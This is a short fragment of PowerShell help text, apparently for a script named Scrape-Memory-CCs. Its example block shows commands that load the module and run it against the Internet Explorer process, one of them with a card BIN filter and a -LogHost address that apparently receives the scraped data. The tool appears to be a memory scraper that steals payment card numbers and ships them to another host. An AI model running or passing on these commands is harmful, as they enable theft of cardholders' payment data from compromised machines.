...
.EXAMPLE
PS C:\> Import-Module Scrape-Memory-CCs.ps1
PS C:\> Scrape-Memory-CCs -Proc iexplore -User admin
PS C:\> Scrape-Memory-CCs -Proc iexplore -User admin -Bin 123456 -LogHost 192.168.5.5 
